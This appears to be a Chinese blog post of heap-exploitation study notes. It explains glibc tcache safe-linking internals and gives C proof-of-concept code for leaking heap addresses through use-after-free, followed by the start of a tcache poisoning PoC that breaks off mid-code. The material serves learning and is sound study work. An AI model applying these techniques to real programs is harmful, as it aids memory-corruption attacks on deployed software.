<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span> @ <span class="built_in">malloc</span>/<span class="built_in">malloc</span>.c</span><br><span class="line">	ptmalloc_init @ <span class="built_in">malloc</span>/arena.c</span><br><span class="line">		tcache_key_initialize</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_key_initialize</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (__getrandom_nocancel(&amp;tcache_key, <span class="keyword">sizeof</span>(tcache_key), GRND_NONBLOCK) != <span class="keyword">sizeof</span>(tcache_key))</span><br><span class="line">    &#123;</span><br><span class="line">        tcache_key = random_bits();</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __WORDSIZE == 64</span></span><br><span class="line">        tcache_key = (tcache_key &lt;&lt; <span class="number">32</span>) | random_bits();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>给一个随机数作为<code>tcache_key</code>,
此后本进程执行期间不再更换<code>tcache_key</code>,
所有加入<code>tcache</code>的堆块都要拷贝该<code>key</code>值</p>
<h5 id="malloc-2">malloc</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc =&gt; __libc_malloc</span><br><span class="line">	=&gt; tcache_get</span><br></pre></td></tr></table></figure>
<p><code>malloc</code>和之前的版本无太大区别</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@ __libc_malloc</span></span><br><span class="line"><span class="type">size_t</span> tc_idx = csize2tidx(tbytes);		<span class="comment">//桶子下标</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache != <span class="literal">NULL</span> &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;	</span><br><span class="line">    victim = tcache_get(tc_idx);</span><br><span class="line">    <span class="keyword">return</span> tag_new_usable(victim);	<span class="comment">//作用不大</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span><span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> tcache_get_n(tc_idx, &amp;tcache-&gt;entries[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get_n</span><span class="params">(<span class="type">size_t</span> tc_idx, tcache_entry **ep)</span></span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *e;</span><br><span class="line">    <span class="keyword">if</span> (ep == &amp;(tcache-&gt;entries[tc_idx]))</span><br><span class="line">        e = *ep;			<span class="comment">//正常tcache调用的tcache_get_n走此分支</span></span><br><span class="line">    <span class="keyword">else</span>				</span><br><span class="line">        e = REVEAL_PTR(*ep);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(!aligned_OK(e)))</span><br><span class="line">        malloc_printerr(<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">		<span class="comment">//#define aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0) 要求堆块基地址低三位全为0,注意是低三位位位</span></span><br><span class="line">    <span class="keyword">if</span> (ep == &amp;(tcache-&gt;entries[tc_idx]))		</span><br><span class="line">        *ep = REVEAL_PTR(e-&gt;next);			<span class="comment">//异或解码next指针, 正常tcache调用的tcache_get_n走此分支</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        *ep = PROTECT_PTR(ep, REVEAL_PTR(e-&gt;next));</span><br><span class="line"></span><br><span class="line">    --(tcache-&gt;counts[tc_idx]);		<span class="comment">//更新计数器</span></span><br><span class="line">    e-&gt;key = <span class="number">0</span>;						<span class="comment">//防止泄露key</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">void</span> *)e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这个<code>tcache_get_n</code>看上去十分诡异</p>
<p>在<code>tcache_get_n(tc_idx, &amp;tcache-&gt;entries[tc_idx]);</code>传参已经很明确了,为啥还要再判断一下呢?</p>
<p>这是因为再另一个函数<code>_mid_memalign</code>中会直接调用<code>tcache_get_n</code>并且这里获取的堆块不一定是桶子头,因此要根据拿走的堆块是头块还是后来块进行区分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tcache_entry **tep = &amp; tcache-&gt;entries[tc_idx];</span><br><span class="line">tcache_entry *te = *tep;</span><br><span class="line"><span class="keyword">while</span> (te != <span class="literal">NULL</span> &amp;&amp; !PTR_IS_ALIGNED (te, alignment))</span><br><span class="line">  &#123;</span><br><span class="line">    tep = &amp; (te-&gt;next);</span><br><span class="line">    te = tcache_next (te);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (te != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">void</span> *victim = tcache_get_n (tc_idx, tep);</span><br><span class="line">    <span class="keyword">return</span> tag_new_usable (victim);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>为什么会有头块和其他块的区别呢?</p>
<p>以为在<code>free</code>时,
<code>tcache-&gt;entries[tc_idx]</code>桶子头指针不会被加密,
但是堆块的next指针会被加密</p>
<p>因此拿头块出来,不需要对
<code>tcache-&gt;entries[tc_idx]</code>指针解密</p>
<p>但是从中间扣一块出来需要解密</p>
</blockquote>
<p>简单来说<code>tcache_get_n</code>干了这三个事</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ep =  &amp;tcache-&gt;entries[tc_idx]</span><br><span class="line">e = *ep</span><br><span class="line"> *ep = REVEAL_PTR(e-&gt;next);</span><br></pre></td></tr></table></figure>
<p><code>ep</code>就是桶子头,</p>
<p><code>e</code>是头上挂着的第一个节点,
由于桶子头到第一个堆块的指针不加密, 因此可以直接解引用拿到头块</p>
<p>接下来要把次块作为新头块链接到桶子头上</p>
<p>但是头块到次块的指针是有加密的,
因此需要先<code>REVEAL_PTR(e-&gt;next);</code>解密
,然后桶子头<code>ep</code>重新指向新头</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241010195555838.png"
alt="image-20241010195555838" />
<figcaption aria-hidden="true">image-20241010195555838</figcaption>
</figure>
<p><code>*ep = REVEAL_PTR(e-&gt;next);</code>具体如何解密呢</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br><span class="line"> *ep 	= REVEAL_PTR(e-&gt;next);</span><br><span class="line">    	= PROTECT_PTR (&amp;e-&gt;next, e-&gt;next)</span><br><span class="line">    	= ( (&amp;e-&gt;next) &gt;&gt;<span class="number">12</span> ) ^ (e-&gt;next)</span><br><span class="line">    	= ( this &gt;&gt; <span class="number">12</span> ) ^ ( next )</span><br></pre></td></tr></table></figure>
<p>就是当前堆块(数据区)地址右移<code>12</code>位然后和<code>next</code>块(数据区)地址做异或</p>
<h5 id="free-2">free</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free =&gt; __libc_free</span><br><span class="line">	=&gt; _int_free</span><br><span class="line">		=&gt; tcache_put</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@ _int_free</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">        tcache_entry *e = (tcache_entry *)chunk2mem(p);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">           trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">           2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">           coincidence before aborting.  */</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache_key)) <span class="comment">// 防止double free</span></span><br><span class="line">        &#123;</span><br><span class="line">            tcache_entry *tmp;</span><br><span class="line">            <span class="type">size_t</span> cnt = <span class="number">0</span>;</span><br><span class="line">            LIBC_PROBE(memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">            <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">                 tmp;</span><br><span class="line">                 tmp = REVEAL_PTR(tmp-&gt;next), ++cnt) <span class="comment">// next指针不再直接指向下一个堆块, 有异或加密</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (cnt &gt;= mp_.tcache_count)</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;free(): too many chunks detected in tcache&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely(!aligned_OK(tmp)))</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;free(): unaligned chunk detected in tcache 2&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (tmp == e)</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">                <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">                   few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">// tc_idx对应桶子中还有剩余堆块</span></span><br><span class="line">        &#123;</span><br><span class="line">            tcache_put(p, tc_idx);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span><span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *e = (tcache_entry *)chunk2mem(chunk);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">       detect a double free.  */</span></span><br><span class="line">    e-&gt;key = tcache_key;		<span class="comment">//给一个key</span></span><br><span class="line"></span><br><span class="line">    e-&gt;next = PROTECT_PTR(&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);	<span class="comment">//next加密</span></span><br><span class="line">    tcache-&gt;entries[tc_idx] = e;		<span class="comment">//头插法 ,注意这个指针是没有加密的</span></span><br><span class="line">    ++(tcache-&gt;counts[tc_idx]);			<span class="comment">//经验+1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里<code>next</code>如何计算的呢?</p>
<p>对于第一个入桶的堆块,此时<code>tcache-&gt;entries[tc_idx] = 0</code>,</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;e-&gt;next</span><br><span class="line">$<span class="number">7</span> = (<span class="keyword">struct</span> tcache_entry **) <span class="number">0x4052a0</span></span><br><span class="line">pwndbg&gt; p tcache-&gt;entries[tc_idx]</span><br><span class="line">$<span class="number">8</span> = (tcache_entry *) <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; p e-&gt;next</span><br><span class="line">$<span class="number">9</span> = (<span class="keyword">struct</span> tcache_entry *) <span class="number">0x405</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e-&gt;next = PROTECT_PTR(&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">e-&gt;next = ( 0x4052a0 &gt;&gt; 12 ) ^ 0</span><br><span class="line">		=0x405</span><br></pre></td></tr></table></figure>
<p>对于第二个入桶的堆块,此时<code>tcache-&gt;entries[tc_idx] = 0x4052a0</code>,
是最后一个进入该桶的堆块指针, 这个指针是没有加密的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;e-&gt;next</span><br><span class="line">$<span class="number">11</span> = (<span class="keyword">struct</span> tcache_entry **) <span class="number">0x4052c0</span></span><br><span class="line">pwndbg&gt; p  tcache-&gt;entries[tc_idx]</span><br><span class="line">$<span class="number">12</span> = (tcache_entry *) <span class="number">0x4052a0</span></span><br><span class="line">pwndbg&gt; p e-&gt;next</span><br><span class="line">$<span class="number">13</span> = (<span class="keyword">struct</span> tcache_entry *) <span class="number">0x4056a5</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e-&gt;next = PROTECT_PTR(&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">e-&gt;next = ( 0x4052c0 &gt;&gt; 12 ) ^ 0x4052a0</span><br><span class="line">		= 0x405 ^ 0x4052a0</span><br><span class="line">		= 0x4056a5</span><br></pre></td></tr></table></figure>
<h4 id="exploit-1">exploit</h4>
<h5 id="safe-linking-uaf">[safe-linking] UAF</h5>
<p>假设我们有<code>UAF</code>的能力,如果想要泄露一个堆块的地址,还需要什么信息?</p>
<blockquote>
<p>“我们有<code>UAF</code>的能力”,说的更直白一些,就是在堆块释放回到<code>tcache</code>之后,可以打印泄露其<code>next</code>字段的值</p>
</blockquote>
<p>假设<code>tcache</code>为空,chunk1,chunk2,chunk3大小相同</p>
<p><strong>现在<code>free(chunk1)</code>释放回<code>tcache</code></strong></p>
<p><code>free</code> 前有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache.entries[idx] = 0</span><br></pre></td></tr></table></figure>
<p><code>free</code>后有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk1.next = ( &amp;chunk1.next &gt;&gt; 12 ) ^ 0 =  chunk1_mem &gt;&gt; 12</span><br><span class="line">tcache.entries[idx]	-&gt; chunk1_mem</span><br></pre></td></tr></table></figure>
<p>即使我们有<code>chunk1</code>的<code>UAF</code>,也只能知道</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1.next = chunk1_mem &gt;&gt; 12</span><br></pre></td></tr></table></figure>
<p>右移计算不可逆,低位数据已经丢失</p>
<p>我们能做的只能是利用<code>UAF</code>获取<code>chunk1.next</code>,也就是获取<code>chunk1</code>所在的虚拟页框号</p>
<p><strong>接着<code>free(chunk2)</code></strong></p>
<p><code>free</code>前有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache.entries[idx] = chunk1_mem</span><br></pre></td></tr></table></figure>
<p><code>free</code> 后有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chunk2.next = ( &amp;chunk2.next &gt;&gt; 12 ) ^ (tcache.entries[idx])</span><br><span class="line">			= ( chunk2_mem &gt;&gt; 12 ) ^ (chunk1_mem)</span><br><span class="line">			</span><br><span class="line">tcache.entries[idx] = chunk2_mem		</span><br></pre></td></tr></table></figure>
<p>又<code>chunk1</code>和<code>chunk2</code>距离比较近,在同一页上,因此两者的虚拟页框号相同,也即</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1_mem &gt;&gt; 12 == chunk2_mem &gt;&gt; 12</span><br></pre></td></tr></table></figure>
<p>那么有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk2.next = (chunk1_mem &gt;&gt; 12) ^ (chunk1_mem)</span><br><span class="line">			= (chunk1.next) ^ (chunk1_mem)</span><br></pre></td></tr></table></figure>
<p>又异或运算可逆,因此有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1_mem = (chunk2.next) ^ (chunk1.next)</span><br></pre></td></tr></table></figure>
<p><strong>同理,如果继续<code>free(chunk3)</code></strong></p>
<p>可以得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk2_mem = (chunk3.next) ^ (chunk1.next)</span><br></pre></td></tr></table></figure>
<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">size_t</span> * chunk1;</span><br><span class="line">  <span class="type">size_t</span> * chunk2;  </span><br><span class="line">  <span class="type">size_t</span> * chunk3;</span><br><span class="line">  <span class="type">size_t</span> chunk1_next;</span><br><span class="line">  <span class="type">size_t</span> chunk2_next;</span><br><span class="line">  <span class="type">size_t</span> chunk3_next;</span><br><span class="line"></span><br><span class="line">  chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  chunk3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">free</span>(chunk1);   <span class="comment">// tcache.entries[idx] ==raw==&gt; [chunk1]</span></span><br><span class="line">  <span class="built_in">free</span>(chunk2);   <span class="comment">// tcache.entries[idx] ==raw==&gt; [chunk2] ====PROTECTED_PTR====&gt; [chunk1]</span></span><br><span class="line"></span><br><span class="line">  chunk1_next = chunk1[<span class="number">0</span>];</span><br><span class="line">  chunk2_next = chunk2[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chunk1 @ %p\n&quot;</span>,chunk1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chunk1_next ^ chunk2_next = %p\n&quot;</span>,chunk1_next ^ chunk2_next);</span><br><span class="line">  assert(chunk1_next ^ chunk2_next == chunk1);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(chunk3);   <span class="comment">// tcache.entries[idx] ==raw==&gt; [chunk3] ====PROTECTED_PTR====&gt; [chunk2] ====PROTECTED_PTR====&gt; [chunk1]</span></span><br><span class="line">  chunk3_next = chunk3[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chunk2 @ %p\n&quot;</span>,chunk2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chunk1_next ^ chunk3_next = %p\n&quot;</span>,chunk1_next ^ chunk3_next);</span><br><span class="line">  assert(chunk1_next ^ chunk3_next == chunk2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/heap/test<span class="meta"># gcc safe.c -o safe -g -w</span></span><br><span class="line">root@Executor:/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/heap/test# ./safe</span><br><span class="line">chunk1 @ <span class="number">0x55fc111882a0</span></span><br><span class="line">chunk1_next ^ chunk2_next = <span class="number">0x55fc111882a0</span></span><br><span class="line">chunk2 @ <span class="number">0x55fc111882c0</span></span><br><span class="line">chunk1_next ^ chunk3_next = <span class="number">0x55fc111882c0</span></span><br></pre></td></tr></table></figure>
<h5 id="safe-linking-tcache-entry-poisoning">[safe-linking] tcache entry
poisoning</h5>
<p>如果还想象往日一样,往一个被释放进入<code>tcache</code>的堆块上挂不干净的东西<code>fake_chunk</code></p>
<p>首先为了满足<code>tcache.counts[idx]</code>的约束,需要堆里至少有两块,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcache.counts[idx] = 2</span><br><span class="line">tcache.entries[idx] =&gt; chunk2 -&gt; chunk1</span><br></pre></td></tr></table></figure>
<p>接下来考虑修改<code>chunk2.next</code>
指向<code>fake_chunk</code></p>
<p>修改完之后<code>tcache</code>的状态如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcache.counts[idx] = 2</span><br><span class="line">tcache.entries[idx] =&gt; chunk2 -&gt; fake_chunk</span><br></pre></td></tr></table></figure>
<p>这种状态<strong>可以看作</strong><code>tcache</code>从<strong>空</strong>到先<code>free(fake_chunk)</code>然后<code>free(chunk2)</code>之后的状态,诚如是,可以从头开始考虑:</p>
<p>在<code>free(fake_chunk)</code>之后,<code>tcache</code>中的状态如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcache.counts[idx] = 1</span><br><span class="line">tcache.entries[idx] =&gt; fake_chunk</span><br></pre></td></tr></table></figure>
<p>此时<code>free(chunk2)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk2.next = ( &amp;chunk2.next &gt;&gt; 12 ) ^ (tcache.entries[idx])</span><br><span class="line">			= ( chunk2_mem &gt;&gt; 12 ) ^ (fake_chunk_mem)</span><br></pre></td></tr></table></figure>
<p>又<code>chunk2_mem &gt;&gt; 12</code>就是<code>chunk2</code>的虚拟页框号,其值等于<code>chunk1.next</code>,因此可以在<code>fake_chunk</code>上链前,先计算得知该值</p>
<p>又<code>fake_chunk_mem</code>是我们已知的目标地址,</p>
<p>因此<code>chunk2.next</code>计算可得</p>
<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// size_t PROTECTED_PTR (size_t pos,size_t ptr)&#123;</span></span><br><span class="line"><span class="comment">//   return ((pos &gt;&gt; 12) ^ ptr);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">//结构体自动对齐到sizeof(tcache_entry) = 0x10</span></span><br><span class="line">  <span class="type">size_t</span> * next;</span><br><span class="line">  <span class="type">size_t</span> key;</span><br><span class="line">&#125;tcache_entry;</span><br><span 